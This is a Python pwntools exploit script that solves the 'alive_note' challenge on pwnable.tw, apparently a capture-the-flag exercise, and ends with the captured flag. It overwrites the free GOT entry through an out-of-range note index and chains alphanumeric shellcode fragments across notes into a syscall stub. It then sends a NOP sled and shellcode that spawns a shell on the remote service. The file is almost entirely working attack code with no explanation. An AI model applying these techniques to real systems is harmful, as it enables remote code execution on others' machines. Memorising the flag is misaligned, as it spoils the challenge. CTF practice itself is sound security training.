#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10300)
#r = remote('127.0.0.1', 7122)
elf = ELF('./alive_note')

def menu():
	r.recvuntil('choice :')

def add(idx, name):
	menu()
	r.send('1\n')
	r.recvuntil('Index :')
	r.send('%d\n' % idx)
	r.recvuntil('Name :')
	#r.interactive()
	r.send(name+'\n')

def dele(idx):
	menu()
	r.send('3\n')
	r.recvuntil('Index :')
	r.send('%d\n' % idx)

junk = 'AAAABBBB'
def cmd(s, idx=0, exc=0):
	global junk
	off = 6-len(s)
	add(idx, flat(s)+'\x71'+chr(0x48+off+exc))	# jmp offset
	add(0, junk)
	add(0, junk)
	add(0, junk)
	add(0, junk)

note = elf.symbols['note']
free_got = elf.got['free']
print 'free got:', hex(free_got)

s1 = [
	'R'*6,		# push edx * 6 (edx is 0)
]
s2 = [
	'R'*2,		# push edx * 2 (edx is 0)
	'a',		# popa
	'XX',		# pop eax * 2
]
s3 = [
	'4\x78',	# xor al, 0x78
	'PY',		# push eax; pop ecx
	'RX',		# push edx; pop eax
]
s4 = [
	# make int 0x80
	'H',		# eax = -1
	'42',		# xor al, 0x32 (al = 0xcd)
	'4A',		# xor al, 0x41
]
s5 = [
	'0A\x48',	# xor BYTE PTR [ecx+0x48],al
	'A',		# inc ecx
	'4M',		# xor al, 0x4d (al = 0x80)
]
s6 = [
	'0A\x48',	# xor BYTE PTR [ecx+0x48],al
	'RX',		# push edx; pop eax
	'Q',		# push ecx
]
s7 = [
	'Z',		# pop edx
	'4\x42',	# xor al, 0x42
	'4\x41',	# xor al 0x41 (= 3)

]
s8 = [
	'AAAAAAAA',
]

free_got_idx = (free_got-note)/4
cmd(flat(s1), free_got_idx)
cmd(flat(s2))
cmd(flat(s3))
cmd(flat(s4))
cmd(flat(s5))
cmd(flat(s6))
cmd(flat(s7), 0, 0x10)
cmd(flat(s8))

#raw_input('@')
dele(0)
r.sendline('\x90'*0x80+asm(shellcraft.sh()))

r.interactive()

# FLAG{Sh3llcoding_in_th3_n0t3_ch4in}
